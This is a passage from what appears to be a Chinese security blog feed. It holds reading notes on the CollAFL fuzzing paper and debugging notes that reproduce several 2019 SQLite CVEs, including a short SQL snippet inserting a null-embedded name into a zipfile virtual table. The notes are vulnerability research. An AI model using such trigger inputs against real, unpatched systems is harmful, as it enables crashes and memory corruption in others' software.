id="如何提高覆盖范围的准确性并引导Fuzzer"><a href="#如何提高覆盖范围的准确性并引导Fuzzer" class="headerlink" title="如何提高覆盖范围的准确性并引导Fuzzer"></a>如何提高覆盖范围的准确性并引导Fuzzer</h3><p>edge coverage提供的信息比block coverage要多，所以选择edge coverage来计算。具体如下：</p><ol><li>通过分析目标程序的控制流图得到已知的edges的一个列表；</li><li>为每个basic block分配一个ID，然后再计算所有edges的hash。</li></ol><p>提出了三种新的指导Fuzzer选择seeds的策略：</p><ul><li>memory-access guided</li><li>untouched-branch guided</li><li>and untouched-descendant guided</li></ul><h3 id="Coverage-sensitive-fuzzing的表现"><a href="#Coverage-sensitive-fuzzing的表现" class="headerlink" title="Coverage sensitive fuzzing的表现"></a>Coverage sensitive fuzzing的表现</h3><p>Dataset：LAVA-M</p><p>explore more code，find more unique crahses and security bugs.</p><h2 id="2-背景和相关工作"><a href="#2-背景和相关工作" class="headerlink" title="2. 背景和相关工作"></a>2. 背景和相关工作</h2><h3 id="模糊器经常使用的产生测试用例的方法："><a href="#模糊器经常使用的产生测试用例的方法：" class="headerlink" title="模糊器经常使用的产生测试用例的方法："></a>模糊器经常使用的产生测试用例的方法：</h3><ul><li>grammar-based：基于语法</li><li>mutation-based：基于变异，不依赖于语法，有更好的可扩展性，代码覆盖率比较低。</li></ul><h3 id="覆盖引导的模糊测试："><a href="#覆盖引导的模糊测试：" class="headerlink" title="覆盖引导的模糊测试："></a>覆盖引导的模糊测试：</h3><ul><li>AFL , libFuzzer, honggfuzz and VUzzer </li></ul><p>Workflow:</p><ol><li>按照某种策略从种子池中选择种子</li><li>对这些种子进行编译得到一批测试用例</li><li>用这些测试用例以高速状态测试应用程序</li><li>监控插桩后的程序，跟踪代码覆盖率和安全问题</li><li>如果检测到了安全问题（crashes、hang out）则报告漏洞</li><li>筛选对代码覆盖率有作用的好的测试用例，把它放入种子池，返回step 1.</li></ol><p>Step3：</p><ul><li>AFL利用Linux提供的fork原理来加速，利用forkserver mode and persistent mode两种模式来减少的fork的载荷。</li><li>AFL支持平行模式（parallel mode），允许多个fuzz实例一起运行。</li></ul><p>Step4:</p><ul><li>静态插桩: AFL 利用GCC和Clang来对源代码进行静态编译</li><li>动态二进制插桩：ALF使用QEMU来对程序进行动态插桩。VUzzer则是PIN；Syzkaller和kAFL使用QEMU来对硬件（例如Intel PT）插桩。</li><li>调试</li><li>系统模拟</li></ul><p>Step5：</p><ul><li>大多使用AddressSanitizer来检测缓冲区溢出错误，也有其他的工具（UBSan、MemorySanitizer、LeakSanitizer、DataFlowSanitizer、ThreadSanitizer、Hex VASan）。</li></ul><h3 id="覆盖率跟踪："><a href="#覆盖率跟踪：" class="headerlink" title="覆盖率跟踪："></a>覆盖率跟踪：</h3><p>edge覆盖率提供的信息要优于block覆盖率。</p><p>AFL采用的是edge覆盖率，但是由于生成hash的Key值的随机性，且如果edge的数量大于64K的话，就会很容易导致hash碰撞，将不同的边误认为同一条边。</p><p>AFL的edge覆盖率并不精确，这很大地限制了AFL的能力。</p><h3 id="种子选择策略："><a href="#种子选择策略：" class="headerlink" title="种子选择策略："></a>种子选择策略：</h3><ul><li>Honggfuzz：按顺序。</li><li>LibFuzzer：优先选择能命中new block的种子。</li><li>VUzzer：优先选择路径较深的种子，很可能可以测试难以到达的路径。</li><li>AFLfast：优先选择出现频率较少的种子，彻底测试cold path。</li></ul><ul><li>QTEP：优先选择覆盖通过静态分析识别的错误代码的种子</li><li>SlowFuzz：优先选择占用更多资源的种子（CPU、内存、energy）</li><li>AFLgo：优先选择更接近于预定目标位置（例如，等待review的新commit）的种子</li></ul><p>本文主要针对利用代码覆盖信息直接指导模糊器去探索未知的路径。</p><h3 id="种子变异策略："><a href="#种子变异策略：" class="headerlink" title="种子变异策略："></a>种子变异策略：</h3><ul><li>AFL、LibFuzzer：使用一组确定性和随机算法来进行种子变异。（种子的来源、在哪里突变、突变有什么价值）</li></ul><p>种子的来源：</p><ul><li>IMF：从正常的应用程序执行中学习系统调用之间的顺序和值依赖关系，然后相应地生成测试用例，从而能够发现许多深层内核bug。</li><li>Skyfire：从丰富的输入中学习一个概率上下文敏感语法来指导testcase生成。</li><li>DIFUZE：利用静态分析在用户空间中组合有效的输入，以测试内核驱动程序。</li><li>AI techniques：RNN、GAN。</li></ul><p>在哪里突变：</p><ul><li>VUzzer：使用控制流和数据流特性来推断要变化的字节(例如，魔术字节)，这对某些类型的数据字段很有用。</li><li>Zhiqiang et.al：提出了一个解决方案来识别敏感字节的变化使用静态数据沿袭分析。</li><li>Mohit Rajpal et.al：提出了一个DNN(深度神经网络)解决方案来断言哪些字节要变异，显示了有希望的改进。</li><li>TaintScope：使用污染分析来识别校验和字节，并在测试期间修复它们。</li></ul><p>突变有什么价值：</p><ul><li>VUzzer：使用动态分析来推断用于突变的interesting values。</li><li>Honggfuzz：在运行时识别感兴趣的值（即cmp指令的操作数），极大地提高了它的路径覆盖率。</li><li>Laf-intel：转换目标应用程序，将长字符或常量比较分解为几个小的比较语句，使fuzzer能够更快地找到匹配的突变和运行新路径。</li></ul><h3 id="本文的重点："><a href="#本文的重点：" class="headerlink" title="本文的重点："></a>本文的重点：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005200917986.png" alt="image-20201005200917986"></p><p>黄色组件为关键部分。首先提高了代码覆盖跟踪的准确性，然后通过替换种子选择策略，利用精确的覆盖信息来引导模糊器。</p><h2 id="3-提高覆盖率的精确性"><a href="#3-提高覆盖率的精确性" class="headerlink" title="3. 提高覆盖率的精确性"></a>3. 提高覆盖率的精确性</h2><h3 id="覆盖粒度："><a href="#覆盖粒度：" class="headerlink" title="覆盖粒度："></a>覆盖粒度：</h3><ul><li>block coverage：在测试期间跟踪每个块的命中计数。但可能会忽略某些路径，如下图：</li></ul><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005201803168.png" alt="image-20201005201803168"></p><ul><li>edge coverage：跟踪每条边的命中次数。一个典型的实现就是AFL所使用的实现。仪器开销类似于块覆盖解决方案。但是，它不跟踪边的顺序，也丢失了一些信息。</li><li>path coverage：跟踪边缘的顺序，提供最完整的代码覆盖信息。然而，路径的长度非常长，并且应用程序中的路径数量很大，因此跟踪路径覆盖的运行时开销和内存开销非常高。在实际应用中，跟踪路径覆盖是不可行的。</li></ul><p>因此，边缘覆盖解决方案在效率和覆盖信息之间达到了一定的平衡。然而，即使对于代表性的边缘覆盖解决方案AFL，也存在hash碰撞问题，会导致不准确。CollAFL采用边缘覆盖跟踪方案，解决了碰撞问题。</p><h3 id="hash碰撞的直接解决方案："><a href="#hash碰撞的直接解决方案：" class="headerlink" title="hash碰撞的直接解决方案："></a>hash碰撞的直接解决方案：</h3><p>扩大进行散列的空间。</p><p>但由于性能和随机性的原因，这并不是一个好的解决方案。</p><h3 id="CollAFL的哈希冲突解决方案："><a href="#CollAFL的哈希冲突解决方案：" class="headerlink" title="CollAFL的哈希冲突解决方案："></a>CollAFL的哈希冲突解决方案：</h3><p>具体hash计算算法为公式2：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005203724140.png" alt="image-20201005203724140"></p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005203659371.png" alt="image-20201005203659371"></p><p>其中x,y,z是待确定的参数，对于不同的边，这些参数可能不同。AFL使用的公式1是该算法的一种具体形式，即对所有边/块(x=0,y=1,z=0)。Fmul的计算过程与AFL相同，开销相同。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005204802750.png" alt="image-20201005204802750"></p><p>目标是找到每个基本块的参数的解决方案，确保通过公式2计算的所有边的hash值都是不同的。</p><p>具体来说：</p><ol><li><p>如果一个块B只有一个父块A：不需要找到参数&lt;x,y,z&gt;的组合。利用下面的公式3直接指定A-&gt;B这条边的hash值。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005205814002.png" alt="image-20201005205814002"></p><p>其中，prev和cur是分配给A和B块的键，而参数c是一个惟一要确定的常量。</p></li><li><p>有多个前例块的hash算法：就使用公式2计算hash值。</p><p>使用贪心算法来解析这些块的参数组合，我们把可以解析的块表示为<em>solvable blocks</em>，把不能解的块表示为<em>unsolvable blocks</em>。对于后者，使用下面的算法进行计算hash：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005211105372.png" alt="image-20201005211105372"></p><p>prev和cur是A和B块的键。它建立一个离线哈希表，对所有以不可解块结尾的边使用唯一的哈希，这与其他所有边的哈希不同。在运行时，它查找这个预先计算的哈希表，以获取这些边的哈希值，使用它们的开始和结束块作为键。</p></li><li><p>整体缓解方案：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201005211806485.png" alt="image-20201005211806485"></p><p>对程序进行预处理，利用前面介绍的算法划分基本块，计算hash值。</p></li><li><p>具体的CalcFmul算法：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006133950479.png" alt="image-20201006133950479"></p><p>首先选择一个参数y，然后迭代每个块BB，遍历的所有组合，以找到一个组合，这样以这个块结束的所有边的散列都不同于其他的散列。如果找不到组合，则此块将被归类为不可解，并放入Unsol中。否则，块将被放入Solv，参数组合将被放入Params。一旦处理了所有具有多个先例的基本块，并且Unsol集足够小，我们就找到了这个问题的解决方案。否则，我们将选择另一个参数y（1- log2（MAPSIZE）），继续前面的过程。</p></li><li><p>具体的CalcHash算法：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006134928799.png" alt="image-20201006134928799"></p><p>如何为不可解析的多先例块建立哈希表。简而言之，它为以不可解析块结尾的每条边随机挑选未使用的散列，并将其存储在哈希映射<em>HashMap</em>中，它还返回未使用散列的自由散列集<em>FreeHashes</em>。</p></li></ol><h3 id="性能分析："><a href="#性能分析：" class="headerlink" title="性能分析："></a>性能分析：</h3><p>三种算法的开销如下：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006173518219.png" alt="image-20201006173518219"></p><p>三种情况的basic blocks数量：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006173601510.png" alt="image-20201006173601510"></p><h3 id="实现细节："><a href="#实现细节：" class="headerlink" title="实现细节："></a>实现细节：</h3><ul><li>使用Clang的默认实现来获取后继和前继信息。</li><li>将间接调用展开为一组直接调用和一个间接调用</li><li>目前CollAFL只对含有源代码的程序有用</li></ul><h2 id="4-优先种子选择"><a href="#4-优先种子选择" class="headerlink" title="4. 优先种子选择"></a>4. 优先种子选择</h2><p>本文实现的主要目标：直接将模糊器引导到未探索的路径上。</p><ul><li>突变一个具有很多未探索的相邻分支路径的种子路径</li><li>突变一个具有很多未探索的相邻子节点路径的种子路径</li><li>突变有很多内存访问操作的种子路径</li></ul><h3 id="CollAFL-br："><a href="#CollAFL-br：" class="headerlink" title="CollAFL-br："></a>CollAFL-br：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006203322701.png" alt="image-20201006203322701"></p><p>其中<em>IsUntouched</em>函数当且仅当边<code>&lt;bb,bb_i&gt;</code>没有被任何先前的测试用例覆盖时返回1，否则返回0。计算的权重值是动态变化的，循环中的一个基本块对总权重的贡献更大。</p><h3 id="CollAFL-desc："><a href="#CollAFL-desc：" class="headerlink" title="CollAFL-desc："></a>CollAFL-desc：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204100064.png" alt="image-20201006204100064"></p><p>其中，*NumDesc(bb_i)*定义为：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204340304.png" alt="image-20201006204340304"></p><p>类似地，如果testcase多次访问一个基本块，我们将迭代该块多次。</p><h3 id="CollAFL-mem："><a href="#CollAFL-mem：" class="headerlink" title="CollAFL-mem："></a>CollAFL-mem：</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201006204850105.png" alt="image-20201006204850105"></p><p>其中，函数<em>NumMemInstrumentation(bb)</em> 返回参数基本块中可静态计算的内存访问操作次数。不同于前两个策略，这是可以静态确定的，类似地，如果testcase多次访问一个基本块，我们将迭代该块多次。</p><h3 id="实现细节：-1"><a href="#实现细节：-1" class="headerlink" title="实现细节："></a>实现细节：</h3><p>用上面三种策略替换了AFL的默认种子选择策略，在编译时获得了每个基本块的内存访问操作的数量和子路径的数量。</p><p>在运行时，在种子<em>testcase  T</em>被测试之后，我们将计算它未探索的邻居分支和子代路径，以及代表性地沿着路径的内存访问操作。更具体地说，我们将首先检查testcase的覆盖率位图，并得到这个testcase覆盖的所有边缘和命中计数。因为每条边都有一个不同的哈希，我们可以从每条边的哈希中解码它的开始和结束块。然后，对于每个块，我们将得到它的未探索邻居分支的列表，基于整体覆盖位图。再加上我们已经收集的子路径和内存访问操作的数量，我们就可以相应地计算所有三个策略的权值。</p><h2 id="5-评估"><a href="#5-评估" class="headerlink" title="5. 评估"></a>5. 评估</h2><h3 id="Hash碰撞问题"><a href="#Hash碰撞问题" class="headerlink" title="Hash碰撞问题"></a>Hash碰撞问题</h3><h4 id="1-hash碰撞的普遍性："><a href="#1-hash碰撞的普遍性：" class="headerlink" title="1). hash碰撞的普遍性："></a>1). hash碰撞的普遍性：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007111648027.png" alt="image-20201007111648027"></p><p>libtorrent应用程序中，超过75%的边与其他边发生碰撞，而它有超过260K条边。而AFL提供的bitmap最多能存储65.5K条边，剩下的194.5K (=260K-65.5K)边都必须与其他边碰撞。</p><h4 id="2-通过扩大bitmap来减少hash碰撞的效果："><a href="#2-通过扩大bitmap来减少hash碰撞的效果：" class="headerlink" title="2). 通过扩大bitmap来减少hash碰撞的效果："></a>2). 通过扩大bitmap来减少hash碰撞的效果：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007112427549.png" alt="image-20201007112427549"></p><p>如果我们位图的大小从64 KB扩大到1 MB,  libtorrent的碰撞比率从75%降至10%左右。但是带来的影响是导致Fuzzer的速度下降：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007112749574.png" alt="image-20201007112749574"></p><p>当扩大到1 MB的时候，对于不同的程序，AFL的执行速度下降了30%-65%不等。而Fuzzer的执行速度对于Fuzzer来说是至关重要的，所以单纯的扩大bitmap的方法是不可行的。</p><h4 id="3-CollAFL的效果："><a href="#3-CollAFL的效果：" class="headerlink" title="3). CollAFL的效果："></a>3). CollAFL的效果：</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007113612722.png" alt="image-20201007113612722"></p><p>使用Fsingle算法插桩的blocks要比使用Fmul的多，而前面提到的Fsingle的开销要比Fmul小，这稍微加快了一点速度。</p><h3 id="代码覆盖率问题"><a href="#代码覆盖率问题" class="headerlink" title="代码覆盖率问题"></a>代码覆盖率问题</h3><h4 id="总体覆盖率改进"><a href="#总体覆盖率改进" class="headerlink" title="总体覆盖率改进"></a>总体覆盖率改进</h4><p>在200小时内探索的路径总数：</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007222228432.png" alt="image-20201007222228432"></p><p>对比了AFL和CollAFL、CollAFL-mem、CollAFL-desc、CollAFL-br，发现的路径总数依次增长；对比AFLfast，CollAFL-fast平均能发现多于AFlfast 8.45%的路径总数。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201007225243763.png" alt="image-20201007225243763"></p><p>同上面不一样，在这里,我们使用覆盖位图计算代码覆盖率。结果都表明，CollAFL可以做得更好。</p><h4 id="覆盖率随时间推移的增长情况"><a href="#覆盖率随时间推移的增长情况" class="headerlink" title="覆盖率随时间推移的增长情况"></a>覆盖率随时间推移的增长情况</h4><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009085629675.png" alt="image-20201009085629675"></p><p>CollAFL、CollAFL-fast都比AFL、AFLfast增长得快；CollAFL-br增长得比CollAFL快，说明<code>br</code>种子选择策略是最有效的；所有的Fuzzer在一开始都能找到很多path，然后在某个时间节点停了下来。</p><h3 id="Unique-crashes"><a href="#Unique-crashes" class="headerlink" title="Unique crashes"></a>Unique crashes</h3><p>由于fuzz的随机性，即使找到了很多的crashes，也不一定能找到更多的vulnerabilities。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009102219647.png" alt="image-20201009102219647"></p><p>以average为baseline（100%）作为比较，在200个小时内使用不同Fuzzer对不同程序进行fuzz发现的unique crashes，CollAFL(具有默认的种子选择策略)在查找唯一崩溃方面优于AFL和AFLfast。加上其余三种优化策略的CollAFL效果更好，简而言之，提出的消除hash碰撞方法效果很好。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009103135189.png" alt="image-20201009103135189"></p><p>对于listswf应用程序，AFLfast在一开始比CollAFLfast发现更多unique crashes，但最终被超越。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009104219062.png" alt="image-20201009104219062"></p><p>使用<code>afl-collect</code>和<code>AddressSanitizer</code>来去除重复的crashes，<strong>CollAFL并没有使用AddressSanitizer，所以有可能会遗漏不会引起崩溃的漏洞。</strong></p><p>unique crashes：7500</p><p>vulnerabilities：157</p><p>CVE vulnerabilities：95。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009105332088.png" alt="image-20201009105332088"></p><h3 id="评估的随机性"><a href="#评估的随机性" class="headerlink" title="评估的随机性"></a>评估的随机性</h3><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009110717825.png" alt="image-20201009110717825"></p><p>20次试验中每个模糊器在路径发现上的平均RSD。通常情况路径发现的偏差小于4%，崩溃发现的偏差小于25%，崩溃发现的随机性要比路径发现的随机性要大。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009111813673.png" alt="image-20201009111813673"></p><p>对于vulnerabilities发现的偏差，表六为统计结果。例如，CollAFL-desc在20个试验中发现了18个Bug-6。在这18个测试中，最快的一个只花费6个小时来找到这个bug，而最慢的一个花费了超过57个小时来找到它。</p><h3 id="Fuzzer对比"><a href="#Fuzzer对比" class="headerlink" title="Fuzzer对比"></a>Fuzzer对比</h3><p>首先，我们评估了AFL的一个变体，即AFL-pc，它使用Clang提供的trace-pc-guard  instrumentation方法来跟踪块覆盖，而不是边缘覆盖。其次，我们采用了<code>lafl-intel</code>提供的另一种工具解决方案，它将长整数和字符串比较操作划分为较小的操作，并将switch语句拆分为一组if-else语句。然后我们分别将lafl-intel与AFL和CollAFL结合，分别表示为<code>AFL-laf</code>和<code>CollAFL-br-laf</code>。</p><p><img src="/2020/11/09/CollAFL%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/image-20201009113027060.png" alt="image-20201009113027060"></p><p>AFL-laf在LAVA数据集上的表现比其他的都好，但是在真实的application中表现不行，这说明LAVA数据集中有大量的长字符/整数比较，但这在真实application中是不会的；CollAFL-br-laf优于AFL-laf，表明该选种策略是有效的。</p><h2 id="6-结论"><a href="#6-结论" class="headerlink" title="6. 结论"></a>6. 结论</h2><p>在本文中，我们研究了覆盖制导模糊雷达中覆盖误差的负面影响。我们提出了一个覆盖敏感的模糊解决方案CollAFL，它解决了最新的模糊AFL中的哈希冲突问题，使边缘覆盖信息更加准确，同时仍然保持低的仪器开销。基于精确的覆盖信息，我们提出了三种新的种子选择策略来驱动模糊器直接到达未探索的路径。实验表明，该方案在路径发现、崩溃发现和漏洞发现方面都是有效和高效的。我们发现了157个新的安全漏洞在24真实世界应用程序中,和95年证实了CVE。</p>]]></content>
      
      
      <categories>
          
          <category> Read Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> CollAFL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLite漏洞调试记录</title>
      <link href="2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/"/>
      <url>2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="1-CVE-2019-19599"><a href="#1-CVE-2019-19599" class="headerlink" title="1. CVE-2019-19599"></a>1. CVE-2019-19599</h2><p>源码：/ext/misc/zipfile.c，这个文件实现了一个虚拟表来读取和写入归档zip文件。</p><p>SQLite有一个表sqlite_master,包含了数据库中所有自建表的信息。</p><p>查看一个表的所有信息：<code>pragma table_info([tablename]);</code></p><h3 id="常见用法："><a href="#常见用法：" class="headerlink" title="常见用法："></a>常见用法：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE VIRTUAL TABLE temp.zip USING zipfile(&#39;test.zip&#39;);</span><br><span class="line">INSERT INTO temp.zip(name, data) VALUES (&#39;dir\x00s1&#39;, NULL);</span><br></pre></td></tr></table></figure><p>利用zipfile功能创建了一个虚表<code>temp.zip</code>,然后向其中插入一条数据。其中<code>name, data</code>是虚表中的两个字段，如果<code>data</code>的值为NULL的话，代表插入的数据是一个目录，否则是文件。</p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述:"></a>漏洞描述:</h3><p>在涉及文件名中嵌入’\0’字符的情况下，SQLite 3.30.1中的ext/misc/zipfile.c会误处理INSERT INTO的某些用法，从而导致可以由（例如）valgrind检测到内存管理错误。</p><h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>在一个终端启动sqlite3:</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200824011634623.png" alt="image-20200824011634623" title="启动sqlite3"></p><p>再在另外一个终端查看sqlite3的进程号：48941</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200824011813218.png" alt="image-20200824011813218" title="sqlite进程信息"></p><p>然后使用root权限启动gdb，在编译sqlite的时候加上<code>-g</code>参数就可以在这里使用file命令载入调试符号表，然后再进行<code>attach 48941</code>就可以正常调试了。</p><h3 id="调试分析："><a href="#调试分析：" class="headerlink" title="调试分析："></a>调试分析：</h3><p>当使用gdb进行附加后，原来的sqlite会进入等待状态，这个时候不能进行任何输入。找到漏洞出现的源代码处，下断点<code>break zipfileUpdate</code>，然后<code>continue</code>，就可以在sqlite的终端输入命令了。</p><p>使用<code>next, print, x</code>命令可以灵活查看调试过程中的变量内容，内存信息，使用<code>set</code>可以修改内容，由于<code>\0</code>字符在终端输入的时候会导致SQL语句被截掉一半的情况，所以为了形成描述中的情况，我在调试的过程中找到变量的位置并插入了’\0’字符。</p><p>而在执行zipfileUpdate的时候，对于目录名，会在目录名之后添加一个’/‘字符，而由于’\0’的截断，会导致对目录名字符串长度计数的变量<code>nPath</code>计算出错，原来是单纯的<code>nPath++</code>,这样实际的目录名长度会比nPath要小，漏洞修复后改为strlen函数来计算正确的长度。</p><h2 id="2-CVE-2019-19317"><a href="#2-CVE-2019-19317" class="headerlink" title="2. CVE-2019-19317"></a>2. CVE-2019-19317</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在生成列的情况下，SQLite 3.30.1中resolve.c中的lookupName忽略了colUsed位掩码中的位，这使攻击者可以拒绝服务或可能造成未指定的其他影响。</p><h3 id="调试分析：-1"><a href="#调试分析：-1" class="headerlink" title="调试分析："></a>调试分析：</h3><p>调试过程和前一个漏洞一样。</p><p>由于暂时未找到触发漏洞处的代码的testcase，暂时搁置，先看论文中提到的4个Bug案例分析，再回头来看这个漏洞。</p><h2 id="3-case-study-1：A-11-year-Bug"><a href="#3-case-study-1：A-11-year-Bug" class="headerlink" title="3. case study 1：A 11-year Bug"></a>3. case study 1：A 11-year Bug</h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>在2009年的check-in中，因为SQL语法中不允许出现GroupBy字句，所以在对IN字句进行优化的函数<code>isCandidateForInOpt</code>中对这一条件进行了断言设置。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200903163744634.png" alt="image-20200903163744634"></p><p>但是在IN字句中，如果出现NATURAL JOIN连接两个DISTINCT子查询的情况的话，会内部设置GROUP BY这个属性，导致断言失败。</p><h3 id="调试分析：-2"><a href="#调试分析：-2" class="headerlink" title="调试分析："></a>调试分析：</h3><p>上面会内部设置GROUP BY这个属性的话，那么在执行IN字句优化例程函数的时候，<code>p-&gt;pGroupBy</code>应该不为0.但是在调试过程中发现，无论sqlite是在添加了<code>-DNDEBUG</code>参数还是没有添加的情况下，使用论文中提到的PoC来验证均发现没有改变这个属性。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907083132163.png" alt="image-20200907083132163" title="Makefile中的Debug参数设置"></p><p>下图为调试过程中的截图：</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907083404723.png" alt="image-20200907083404723"></p><h2 id="4-case-study-2：Database-leakage"><a href="#4-case-study-2：Database-leakage" class="headerlink" title="4. case study 2：Database leakage"></a>4. case study 2：Database leakage</h2><p>原来这个就是CVE-2019-19959，怪我没有仔细看。</p><p>按照论文中给出的PoC来验证，感觉没有什么异常啊，只是单纯的把经过zipfile函数生成的一个zip用hex的方式显示出来了而已，而且调试过程中并没有走到漏洞的源代码处。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907092046829.png" alt="image-20200907092046829" title="CVE-2019-19959 PoC验证"></p><h2 id="5-case-study-3：UAF-from-Assertion"><a href="#5-case-study-3：UAF-from-Assertion" class="headerlink" title="5. case study 3：UAF from Assertion"></a>5. case study 3：UAF from Assertion</h2><p>这个bug获得了CVE编号：CVE-2019-20218。</p><p>使用PoC验证时，sqlite直接爆语法错误。第二条sql语句需要和第三条同时输入，然后再测试第三条SQL语句。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907115230945.png" alt="image-20200907115230945" title="CVE-2019-20218 PoC验证"></p><p>由于第二条语句创建的是一个循环视图（创建视图v2的数据来自要创建的视图v2），会导致其pWith指针称为一个悬空指针。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907115849015.png" alt="image-20200907115849015" title="悬空指针"></p><p>但是调试到后面，导致程序崩溃的情况是在一个比较函数里面：</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200907164940502.png" alt="image-20200907164940502" title="sqlite3StrICmp函数"></p><p>而且调用这个函数的地方是在这个漏洞修补处的前面，按道理在后面修补，前面同样会出问题的吧，且还没找到关于<code>p-&gt;pWith</code>指针的断言语句。</p><p>而且我在加上<code>-DNDEBUG</code>参数之后再来测试，同样的还是崩溃了。</p><p>后在大佬的指导下，解决了调试不能断在assert函数的地方的问题，需要再设置<code>-DSQLITE_DEBUG</code>这个参数，<code>sqlite3.c</code>中解释了这两个参数必须是相反的，如果注释了<code>-DNDEBUG</code>且没有定义<code>-DSQLITE_DEBUG</code>那么就会再次将<code>-DNDEBUG</code>设为1，所以解决方法就是注释掉<code>-DNDEBUG</code>的同时定义<code>-DSQLITE_DEBUG</code>。</p><p><img src="/2020/11/09/SQLite%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/image-20200920004802260.png" alt="image-20200920004802260"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF8月赛：magic_number</title>
      <link href="2020/09/19/DASCTF8%E6%9C%88%E8%B5%9B%EF%BC%9Amagic-number/"/>
